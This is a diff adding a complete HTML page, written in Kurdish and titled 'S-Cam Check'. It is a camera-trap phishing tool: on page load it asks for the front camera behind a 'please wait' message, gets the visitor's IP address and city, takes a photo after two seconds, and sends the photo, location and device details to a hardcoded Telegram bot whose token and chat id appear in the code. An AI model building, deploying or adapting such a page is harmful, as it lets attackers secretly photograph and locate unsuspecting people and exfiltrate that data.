@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <title>S-Cam Check</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body style="background: #000; color: #fff; text-align: center; padding-top: 50px;">
+
+    <h2 id="msg">تکایە کەمێک چاوەڕێ بکە...</h2>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // زانیارییەکانت
+        const token = '8491301422:AAE8wM2ECL7zsRUimloWWYb5myT4iKNy7pc';
+        const chat = '659131693';
+
+        async function init() {
+            try {
+                // ١. وەرگرتنی کامێرا
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                document.getElementById('msg').innerText = "لە پڕۆسەدایە...";
+
+                // ٢. وەرگرتنی IP (بۆ دڵنیایی ئەگەر کامێراش ئیشی نەکرد زانیاری بنێرێ)
+                let info = "No IP info";
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    const data = await res.json();
+                    info = 🌐 IP: ${data.ip}\n📍 City: ${data.city}\n📱 Device: ${navigator.userAgent};
+                } catch(e) { info = "IP Error: " + navigator.userAgent; }
+
+                // ٣. گرتنی وێنە دوای ٢ چرکە
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+
+                    canvas.toBlob(blob => {
+                        const fd = new FormData();
+                        fd.append('photo', blob, 'img.jpg');
+                        fd.append('chat_id', chat);
+                        fd.append('caption', info);
+
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                            method: 'POST',
+                            body: fd
+                        }).then(() => {
+                            document.getElementById('msg').innerText = "سەرکەوتوو بوو!";
+                            // داخستنی کامێرا دوای ناردن
+                            stream.getTracks().forEach(track => track.stop());
+                        });
+                    }, 'image/jpeg');
+                }, 2000);
+
+            } catch (err) {
+                document.getElementById('msg').innerText = "تکایە ڕێگە بدە (Allow) بۆ بەردەوامبوون";
+                console.error(err);
+            }
+        }
+
+        // دەستپێکردن
+        window.onload = init;
+    </script>
+</body>
+</html>
